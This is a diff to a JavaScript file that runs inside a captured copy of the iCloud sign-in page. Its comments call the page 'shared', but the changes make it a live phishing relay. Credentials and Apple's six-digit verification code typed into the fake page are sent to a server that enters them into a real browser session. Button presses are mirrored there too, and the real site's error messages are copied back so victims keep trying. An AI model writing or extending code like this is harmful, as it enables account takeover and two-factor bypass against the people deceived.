@@ -1,15 +1,30 @@
 /* Runs inside every captured page served from /src.
  *
- * The page is a static capture, so there is no real browser behind it to type
- * into. What this does instead is make the page shared: what you type, where
- * you click and which page you move to go to the server, and the server hands
- * them to every other viewer - and to the next viewer that loads, so what has
- * already been done is still there.
+ * The page is a capture of a page that is somewhere else - the sign-in form
+ * of icloud.com, say - so on its own it is a picture of a page: nothing it
+ * does reaches the browser that holds the session. This is what makes it a
+ * page again.
+ *
+ * Three things happen here:
+ *
+ *  - What is typed into the capture is reported to the server, which writes
+ *    it into the real browser, in the field with the same id. The capture
+ *    keeps the ids of the page it was taken from, so there is nothing to
+ *    translate.
+ *  - A button that is pressed in the capture is pressed in the real browser
+ *    as well.
+ *  - What the real browser is showing - where it is, and what its fields
+ *    hold - is put back into the capture, so the capture shows the session
+ *    rather than the moment it was taken.
+ *
+ * And what it did before, which is still true: what you type and where you
+ * click go to the server, and the server hands them to every other viewer,
+ * so the session follows you between tabs.
  *
  * Deliberately narrow:
  *
- *  - A click is relayed as a marker, not replayed. Replaying it in another tab
- *    would press the same button twice.
+ *  - A click is relayed to the other viewers as a marker, not replayed.
+ *    Replaying it in another tab would press the same button twice.
  *  - Programmatic changes are applied under `applying`, and setting `.value`
  *    does not fire `input`, so nothing echoes back and forth.
  *  - The document is otherwise left alone: this is the captured page, and the
@@ -36,12 +51,22 @@
   var timers = new WeakMap();   // element -> debounce timer
   var last = new WeakMap();     // element -> {key, value, checked} last sent
 
+  // The page is made of more than one document: the page itself, and the
+  // frames it can reach. A SingleFile capture keeps the sign-in form inside
+  // an <iframe srcdoc="...">, so the form is in a frame of its own, and a
+  // field in it is not a field of this document.
+  var documents = [];       // [{id, doc}] - the page, then the frames
+  var docIds = new WeakMap();
+  var docCounter = 0;
+
   // ------------------------------------------------------------------
   // Element identity
   //
   // The server has to be able to name an element in a page it has not parsed.
   // A selector built from ids and positions is stable across the identical
-  // copy of the same captured file, which is all that is needed.
+  // copy of the same captured file, which is all that is needed. An element
+  // in a frame is named by the frame it is in first, so the same selector in
+  // two documents is two different elements.
   // ------------------------------------------------------------------
 
   function escapeId(id) {
@@ -51,13 +76,30 @@
     return id.replace(/([^\w-])/g, "\\$1");
   }
 
-  function keyFor(el) {
-    if (!el || el.nodeType !== 1) return "";
+  function documentId(doc) {
+    var id = docIds.get(doc);
+    if (id === undefined) {
+      id = docCounter === 0 ? "" : "f" + docCounter;
+      docCounter += 1;
+      docIds.set(doc, id);
+    }
+    return id;
+  }
+
+  // A key that names an element in a frame starts with '@', which no
+  // selector can start with, so the frame and the page it is in are never
+  // confused for one another.
+  function frameKey(id, selector) {
+    return "@" + id + " " + selector;
+  }
+
+  function selectorFor(el) {
     if (el.id) return "#" + escapeId(el.id);
 
     var parts = [];
     var node = el;
-    while (node && node.nodeType === 1 && node !== document.documentElement) {
+    var root = el.ownerDocument ? el.ownerDocument.documentElement : document.documentElement;
+    while (node && node.nodeType === 1 && node !== root) {
       var part = node.tagName.toLowerCase();
       var parent = node.parentElement;
       if (parent) {
@@ -77,6 +119,48 @@
     return parts.join(" > ");
   }
 
+  function keyFor(el) {
+    if (!el || el.nodeType !== 1) return "";
+    var selector = selectorFor(el);
+    if (!selector) return "";
+    var id = documentId(el.ownerDocument || document);
+    return id ? frameKey(id, selector) : selector;
+  }
+
+  function documentFor(id) {
+    for (var i = 0; i < documents.length; i++) {
+      if (documents[i].id === id) return documents[i].doc;
+    }
+    return null;
+  }
+
+  function documentOfKey(key) {
+    if (key.charAt(0) !== "@") return { doc: document, selector: key };
+    var cut = key.indexOf(" ");
+    if (cut < 0) return null;
+    var doc = documentFor(key.slice(1, cut));
+    if (!doc) return null;
+    return { doc: doc, selector: key.slice(cut + 1) };
+  }
+
+  function elementOfKey(key) {
+    var where = documentOfKey(key);
+    if (!where) return null;
+    try {
+      return where.doc.querySelector(where.selector);
+    } catch (err) {
+      return null;   // a selector the browser will not take is simply not ours
+    }
+  }
+
+  function findById(id) {
+    for (var i = 0; i < documents.length; i++) {
+      var el = documents[i].doc.getElementById(id);
+      if (el) return el;
+    }
+    return null;
+  }
+
   // ------------------------------------------------------------------
   // Sending
   // ------------------------------------------------------------------
@@ -93,6 +177,14 @@
     // A value typed before the socket is up still matters; a stale queue of
     // them does not, so it is capped.
     if (queued.length < 100) queued.push(message);
+  }
+
+  // "Where is the browser?" The answer is what the browser is showing, and
+  // it is asked for whenever a document is bound: a frame that has just
+  // loaded may hold the fields, and the state that was sent before it was
+  // bound never reached them.
+  function askWhere() {
+    send({ t: "where" });
   }
 
   function connect() {
@@ -170,6 +262,49 @@
 
     last.set(el, { key: now.key, value: now.value, checked: now.checked });
     send({ t: "value", key: now.key, value: now.value, checked: now.checked });
+
+    // The same word goes to the browser the server holds, so the capture and
+    // the session stay the same thing.
+    if (el.id) {
+      send({ t: "field", id: el.id, value: now.value, checked: now.checked });
+      return;
+    }
+
+    // No id: the browser can still be told, by what the control is and how
+    // many of them there are. Apple's verification code boxes have no ids
+    // at all - six inputs - and the third one is the third one in the real
+    // page too.
+    var place = placeOf(el);
+    if (place) {
+      send({
+        t: "field",
+        id: "",
+        tag: place.tag,
+        n: place.n,
+        of: place.of,
+        value: now.value,
+        checked: now.checked,
+      });
+    }
+  }
+
+  // Where a control sits among the ones like it: the third input of the
+  // document, and how many inputs it has.
+  function placeOf(el) {
+    var doc = el.ownerDocument || document;
+    var tag = (el.tagName || "").toLowerCase();
+    if (!tag || !doc.getElementsByTagName) return null;
+
+    var all = doc.getElementsByTagName(tag);
+    var n = 0;
+    for (var i = 0; i < all.length; i++) {
+      if (all[i] === el) {
+        n = i + 1;
+        break;
+      }
+    }
+    if (!n) return null;
+    return { tag: tag, n: n, of: all.length };
   }
 
   function onFieldEvent(event) {
@@ -199,12 +334,7 @@
   function apply(entry) {
     if (!entry || !entry.key) return;
 
-    var el = null;
-    try {
-      el = document.querySelector(entry.key);
-    } catch (err) {
-      return;   // a selector the browser will not take is simply not ours
-    }
+    var el = elementOfKey(entry.key);
     if (!el) return;
 
     applying = true;
@@ -223,6 +353,176 @@
     } finally {
       applying = false;
     }
+  }
+
+  // ------------------------------------------------------------------
+  // The browser behind the capture
+  //
+  // What the browser is showing is put back into the capture: the same
+  // field, the same value. A field the person is typing into is left
+  // alone - the browser is behind them, and their keystrokes are the
+  // newer truth.
+  // ------------------------------------------------------------------
+
+  function applyBrowser(message) {
+    var fields = message.fields || {};
+    Object.keys(fields).forEach(function (id) {
+      var entry = fields[id];
+      if (!entry || typeof entry !== "object") return;
+
+      var el = findById(id);
+      if (!el) return;
+
+      var doc = el.ownerDocument;
+      if (doc && doc.activeElement === el) return;
+
+      apply({
+        key: keyFor(el),
+        value: typeof entry.value === "string" ? entry.value : "",
+        checked: !!entry.checked,
+      });
+    });
+
+    applyMessages(message.messages);
+  }
+
+  // ------------------------------------------------------------------
+  // What the browser is saying
+  //
+  // The browser says when the details are wrong: "Check the account
+  // information you entered and try again." The capture has to say it too,
+  // or the person correcting the details cannot see what is wrong with
+  // them.
+  //
+  // The capture does not carry the stylesheet for a message that was not
+  // there when it was taken, so the way the browser shows the message is
+  // read as well - the colours, the size - and put on the message in the
+  // capture. The message is put where the browser puts it: under the field
+  // it is about.
+  // ------------------------------------------------------------------
+
+  var shown = [];
+
+  function applyMessages(messages) {
+    shown.forEach(function (el) {
+      if (el && el.parentNode) el.parentNode.removeChild(el);
+    });
+    shown = [];
+
+    if (!messages || !messages.length) {
+      // Nothing is wrong any more: the capture's own forgot-password link
+      // comes back, if the message was the one carrying it.
+      restoreForgotLink();
+      return;
+    }
+
+    var carriesLink = false;
+    messages.forEach(function (message) {
+      if (!message || typeof message !== "object") return;
+      var el = buildMessage(message);
+      if (!el) return;
+      shown.push(el);
+      if (message.has_link) carriesLink = true;
+    });
+
+    // The message the browser shows carries its own forgot-password link,
+    // so the capture's own link would be the same link twice.
+    if (carriesLink) hideForgotLink();
+    else restoreForgotLink();
+  }
+
+  function buildMessage(message) {
+    var spot = messageSpot(message);
+    if (!spot) return null;
+
+    var doc = spot.parent.ownerDocument || document;
+    var el = doc.createElement("span");
+    el.className = message.className || "form-message";
+    el.setAttribute("dir", "auto");
+    el.setAttribute("data-live-message", "1");
+
+    var style = message.style || {};
+    Object.keys(style).forEach(function (name) {
+      var value = style[name];
+      if (typeof value === "string" && value) el.style[name] = value;
+    });
+
+    // The browser's own wording, with the link it carries.
+    if (typeof message.html === "string" && message.html) {
+      el.innerHTML = message.html;
+    } else {
+      el.textContent = typeof message.text === "string" ? message.text : "";
+    }
+
+    spot.parent.insertBefore(el, spot.next || null);
+    makeRoom(el);
+    return el;
+  }
+
+  // The capture's content area was given a height for the message that was
+  // not there when it was taken - the message is the reason the area has
+  // that height, and without it the message lands on top of what is below.
+  function makeRoom(el) {
+    var area = el.closest ? el.closest(".signin-content") : null;
+    if (!area) return;
+    try {
+      var height = area.getBoundingClientRect().height;
+      if (!height) return;
+      area.style.minHeight = height + 28 + "px";
+    } catch (err) {
+      /* the area is not laid out; leave it alone */
+    }
+  }
+
+  // Where the message goes: under the field it is about, the way the
+  // browser puts it.
+  function messageSpot(message) {
+    var doc = document;
+
+    if (message.field) {
+      var field = findById(message.field);
+      if (field) {
+        // The message goes on the line above the row of small print - the
+        // way the browser puts it, and where there is room for it.
+        var content = field.closest ? field.closest(".signin-content") : null;
+        var footer = content ? content.querySelector(".signin-content__footer") : null;
+        if (content && footer && footer.parentNode === content) {
+          return { parent: content, next: footer };
+        }
+
+        var wrapper = field.closest ? field.closest(".form-cell-wrapper") : null;
+        if (wrapper && wrapper.parentNode) {
+          return { parent: wrapper.parentNode, next: wrapper.nextSibling };
+        }
+        if (field.parentNode) {
+          return { parent: field.parentNode, next: field.nextSibling };
+        }
+      }
+    }
+
+    // The neighbour the message sits after in the browser: the capture is
+    // the same page, so the same neighbour is in it.
+    if (message.before) {
+      var before = findById(message.before);
+      if (before && before.parentNode) {
+        return { parent: before.parentNode, next: before.nextSibling };
+      }
+    }
+
+    var signin = findById("signin");
+    if (signin) return { parent: signin, next: null };
+    if (doc.body) return { parent: doc.body, next: null };
+    return null;
+  }
+
+  function hideForgotLink() {
+    var link = findById("iforgot-link");
+    if (link && link.parentNode) link.parentNode.style.display = "none";
+  }
+
+  function restoreForgotLink() {
+    var link = findById("iforgot-link");
+    if (link && link.parentNode) link.parentNode.style.display = "";
   }
 
   // ------------------------------------------------------------------
@@ -276,6 +576,53 @@
     }
   }
 
+  // The nearest thing a click means something on, or null.
+  function clickable(el) {
+    while (el && el.nodeType === 1) {
+      var tag = (el.tagName || "").toLowerCase();
+      if (tag === "a" || tag === "button") return el;
+      if (el.getAttribute) {
+        var role = el.getAttribute("role");
+        if (role === "button") return el;
+      }
+      if (tag === "input") {
+        var type = (el.getAttribute("type") || "").toLowerCase();
+        if (type === "button" || type === "submit") return el;
+        return null;      // a text field is a value, not a click
+      }
+      el = el.parentElement;
+    }
+    return null;
+  }
+
+  // A press in the capture is a press in the browser, but only where the
+  // browser can be told what was pressed. A button with an id is one. A
+  // link is one too, but only when it goes somewhere real: a link between
+  // two captures is a link inside this app, and following it in the browser
+  // would take the session to a page that does not exist.
+  function pressable(el) {
+    if (!el || !el.id) return null;
+    var tag = (el.tagName || "").toLowerCase();
+    if (tag === "button") return el;
+    if (tag === "input") {
+      var type = (el.getAttribute("type") || "").toLowerCase();
+      if (type === "button" || type === "submit") return el;
+      return null;
+    }
+    if (tag === "a") {
+      var href = el.getAttribute("href") || "";
+      if (!href || href.charAt(0) === "#") return null;
+      try {
+        var url = new URL(href, location.href);
+        if (url.origin !== location.origin) return el;   // somewhere real
+      } catch (err) {
+        return null;
+      }
+      return null;                                       // inside this app
+    }
+    return null;
+  }
+
   function onClick(event) {
     var target = event.target;
     if (!target || target.nodeType !== 1) return;
@@ -296,6 +643,14 @@
     }
 
     send({ t: "click", key: keyFor(target), x: event.pageX, y: event.pageY });
+
+    // The same press, in the browser the server holds.
+    var press = pressable(clickable(target));
+    if (press) {
+      // The page is sent with it: what a press does can depend on where it
+      // was pressed - the flow says which page leads to which.
+      send({ t: "press", id: press.id, page: location.pathname });
+    }
   }
 
   // ------------------------------------------------------------------
@@ -335,6 +690,11 @@
       return;
     }
 
+    if (message.t === "browser") {
+      applyBrowser(message);
+      return;
+    }
+
     if (message.t === "click") {
       marker(message);
       return;
@@ -368,16 +728,82 @@
   }
 
   function onSubmit(event) {
-    // There is no backend behind a captured form: submitting it would replace
-    // the page with the app's 404 and end the shared session. The page's own
-    // handlers still run - this only cancels the navigation.
+    // A captured form is not submitted here: the browser behind it is the
+    // one that has a session, and the press is sent there instead. The
+    // page's own handlers still run - this only cancels the navigation.
     event.preventDefault();
   }
 
-  document.addEventListener("input", onFieldEvent, true);
-  document.addEventListener("change", onFieldEvent, true);
-  document.addEventListener("click", onClick, true);
-  document.addEventListener("submit", onSubmit, true);
+  // ------------------------------------------------------------------
+  // The frames
+  //
+  // A capture carries the sign-in form inside a frame, and a frame that is
+  // not reachable - one of another origin, or one the browser has not let
+  // this page into - is left alone. A reachable one is a document of its
+  // own, and it is bound as one.
+  // ------------------------------------------------------------------
+
+  function bindDocument(doc) {
+    if (!doc || doc.__icloudBound) return false;
+    doc.__icloudBound = true;
+
+    var id = documentId(doc);
+    documents.push({ id: id, doc: doc });
+
+    doc.addEventListener("input", onFieldEvent, true);
+    doc.addEventListener("change", onFieldEvent, true);
+    doc.addEventListener("click", onClick, true);
+    doc.addEventListener("submit", onSubmit, true);
+    doc.addEventListener("load", onFrameLoad, true);
+
+    // This document may hold fields the browser knows about and the page
+    // does not, so the state is asked for again now that it is bound.
+    askWhere();
+    return true;
+  }
+
+  function framesIn(target) {
+    if (!target || !target.querySelectorAll) return [];
+    var found = target.querySelectorAll("iframe, frame");
+    var out = [];
+    for (var i = 0; i < found.length; i++) out.push(found[i]);
+    return out;
+  }
+
+  function descend(target) {
+    var inner = [];
+    // The target may itself be a frame - that is the usual case: a frame
+    // that has just finished loading is handed over as the target.
+    var tag = (target && target.tagName || "").toLowerCase();
+    if (tag === "iframe" || tag === "frame") inner.push(target);
+
+    var found = framesIn(target);
+    for (var i = 0; i < found.length; i++) inner.push(found[i]);
+
+    for (var j = 0; j < inner.length; j++) {
+      var doc = null;
+      try {
+        doc = inner[j].contentDocument;     // same origin: this works
+      } catch (err) {
+        doc = null;                         // another site: leave it be
+      }
+      if (!doc) continue;
+      if (bindDocument(doc)) descend(doc);
+    }
+  }
+
+  function onFrameLoad(event) {
+    // A frame that has just finished loading may hold the fields, and may
+    // hold frames of its own.
+    var target = event.target;
+    if (!target) return;
+    if ((target.tagName || "").toLowerCase() !== "iframe" &&
+        (target.tagName || "").toLowerCase() !== "frame") return;
+    descend(target);
+  }
+
+  bindDocument(document);
+  descend(document);
 
   if (document.readyState === "loading") {
     document.addEventListener("DOMContentLoaded", start);
@@ -389,5 +815,10 @@
 
   // One handle, so the page can be inspected from the console without
   // reaching into a closure.
-  window.__icloudSync = { keyFor: keyFor, apply: apply };
+  window.__icloudSync = {
+    keyFor: keyFor,
+    apply: apply,
+    documents: documents,
+    findById: findById,
+  };
 })();
